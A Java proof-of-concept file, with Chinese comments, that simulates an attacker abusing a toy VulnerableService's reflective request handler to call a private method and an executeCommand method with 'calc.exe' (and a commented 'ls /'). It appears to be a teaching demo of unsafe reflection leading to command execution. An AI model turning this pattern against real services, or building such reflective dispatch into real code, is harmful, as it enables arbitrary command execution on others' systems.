package main.java.exploit; // 注意包名

import main.java.exploit.VulnerableService; // 导入VulnerableService类

public class AttackerSimulation {

    public static void main(String[] args) {
        VulnerableService service = new VulnerableService();

        System.out.println("--- Simulating Legitimate Call (echo) ---");
        String resultLegit = service.processRequestVulnerable(
                "main.java.exploit.VulnerableService", // 正确的类名
                "echo",                                     // 合法的方法名
                "Hello World"                               // 参数
        );
        System.out.println("Result: " + resultLegit);
        System.out.println("----------------------------------------");


        System.out.println("\n--- Simulating Malicious Call 1: Calling a private method (sensitiveOperation) ---");
        // 攻击者尝试调用私有的 sensitiveOperation 方法
        String resultPrivate = service.processRequestVulnerable(
                "main.java.exploit.VulnerableService", // **修正了类名**
                "sensitiveOperation",                        // 私有方法名
                "Confidential Data"                         // 参数
        );
        System.out.println("Result (Attempt to call private): " + resultPrivate);
        System.out.println("----------------------------------------");


        System.out.println("\n--- Simulating Malicious Call 2: Calling the dangerous executeCommand method (Popping Calc) ---");
        // ** 攻击者尝试调用 executeCommand 方法，参数是 "calc.exe" **
        // 如果在Windows上运行，这应该会弹出计算器
        String resultCommand = service.processRequestVulnerable(
                "main.java.exploit.VulnerableService", // 正确的类名
                "executeCommand",                           // ** 危险的方法名 **
                "calc.exe"                                  // ** 弹计算器的命令 (Windows) **
                // 如果在Linux/macOS上测试，可以尝试 "xterm" (如果已安装) 或其他命令如 "ls /"
                // "ls /"
        );
        System.out.println("Result (Attempt to pop calc): " + resultCommand); // executeCommand 返回 void，所以 invoke 返回 null
        System.out.println("----------------------------------------");


        System.out.println("\n--- Simulating Another Legitimate Call (echo again) ---");
        String resultDiffClass = service.processRequestVulnerable(
                "main.java.exploit.VulnerableService", // 正确的类名
                "echo",
                "Another input after exploit attempt"
        );
        System.out.println("Result: " + resultDiffClass);
        System.out.println("----------------------------------------");

        System.out.println("\n--- Simulation Finished ---");

    }
}